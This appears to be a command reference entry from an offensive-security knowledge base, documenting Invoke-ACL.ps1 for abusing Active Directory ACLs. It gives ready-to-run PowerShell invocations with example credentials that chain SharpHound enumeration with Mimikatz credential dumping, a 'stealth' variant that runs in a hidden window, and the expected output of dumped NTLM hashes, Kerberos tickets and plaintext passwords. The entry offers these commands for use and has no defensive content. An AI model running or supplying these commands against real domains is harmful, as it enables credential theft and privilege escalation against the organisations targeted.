---
id: 1be12edd-d624-4085-962e-d0e80dc91751
name: invoke-acl-powershell-script
type: command
executor: powershell
data: >-
  ./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimikatzLocation
  .\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'
output: null
created_at: '2023-04-06T03:56:06.826356+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - active-directory
  - acl-abuse
verified: true
validated: true
---

# invoke-acl-powershell-script

## Command

```powershell
./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimikatzLocation .\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'
```

## Description

This command executes the Invoke-ACL.ps1 script to discover and exploit unsafe ACL configurations in Active Directory. It uses SharpHound for AD enumeration (collecting ACL data) and Mimikatz for credential extraction from identified weak points, facilitating privilege escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -SharpHoundLocation | Path to SharpHound.exe for AD data collection | Yes |
| -mimikatzLocation | Path to Mimikatz.exe for credential dumping | Yes |
| -Username | Username for authentication to the domain | Yes |
| -Domain | Target AD domain name | Yes |
| -Password | Password for the specified username | Yes |

## Examples

### Basic Usage

```powershell
./Invoke-ACL.ps1 -SharpHoundLocation .\tools\sharphound.exe -mimikatzLocation .\tools\mimikatz.exe -Username 'lowprivuser' -Domain 'corp.local' -Password 'P@ssw0rd'
```

### Advanced Usage

Run in a hidden PowerShell window for stealth:

```powershell
powershell -WindowStyle Hidden -File ./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimikatzLocation .\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'
```

## Expected Output

The script outputs a JSON or text report from SharpHound detailing vulnerable ACLs (e.g., objects with WriteDACL to non-admins), followed by Mimikatz results showing extracted NTLM hashes, Kerberos tickets, or plaintext passwords. Success is indicated by identified exploits like "Vulnerable OU found: CN=Users,DC=domain,DC=local" and dumped credentials.

## Related

- [[procedures/Abuse-Active-Directory-ACLs-Using-WriteDACL-and-Invoke-ACL-Tool]]
- [[tools/SharpHound]]
- [[tools/Mimikatz]]
